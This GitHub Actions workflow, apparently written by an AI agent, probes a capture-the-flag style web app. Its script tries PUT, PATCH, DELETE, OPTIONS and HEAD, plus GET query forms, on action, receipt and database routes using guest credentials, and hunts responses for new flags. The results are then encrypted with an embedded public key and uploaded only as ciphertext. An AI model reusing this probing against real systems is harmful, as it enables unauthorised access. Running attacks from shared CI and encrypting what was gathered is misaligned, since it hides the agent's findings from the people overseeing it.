name: launchlet-part3-methods
on:
  push:
    branches: [agent/launchlet-part3-methods-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe known endpoint methods and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          preview='launchlet-demo-board'; receipt='lrec_preview_demo_2026'; ref='preview-8b11c'; aid='act_6f4b9a2c1d0e8a71'
          action='/api/actions/invoke'; redeem='/api/receipts/redeem'; data='/api/db/rest/v1/workspace_notes'
          auth={'apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session','X-Launchlet-Preview':preview,'Accept':'application/json'}
          cases=[]
          # Known route GET/query forms
          aq={'actionId':aid,'workspaceId':'ws-launchlet-public','projectId':preview,'deployRef':ref}
          rq={'receipt':receipt,'project':preview,'deployRef':ref}
          cases += [('GET action', 'GET', action+'?'+urllib.parse.urlencode(aq), None),('GET redeem','GET',redeem+'?'+urllib.parse.urlencode(rq),None)]
          # Nonstandard methods on known routes
          action_body={'actionId':aid,'args':{'workspaceId':'ws-launchlet-public','projectId':preview}}
          redeem_body={'receipt':receipt,'project':preview}
          for m in ['PUT','PATCH','DELETE','OPTIONS','HEAD']:
            cases.append((m+' action',m,action,action_body))
            cases.append((m+' redeem',m,redeem,redeem_body))
            cases.append((m+' data',m,data+'?select=*',{'workspace_id':'ws-launchlet-public','title':'probe','body':'probe'}))
          res=[]
          for name,m,p,b in cases:
            h={**auth}
            if b is not None:h['Content-Type']='application/json'
            try:r=s.request(m,base+p,headers=h,json=b if b is not None else None,timeout=8,allow_redirects=False)
            except Exception as e:res.append({'name':name,'error':repr(e)});continue
            item={'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
            flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(r.text);break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-methods-encrypted
          path: artifact/
          retention-days: 1
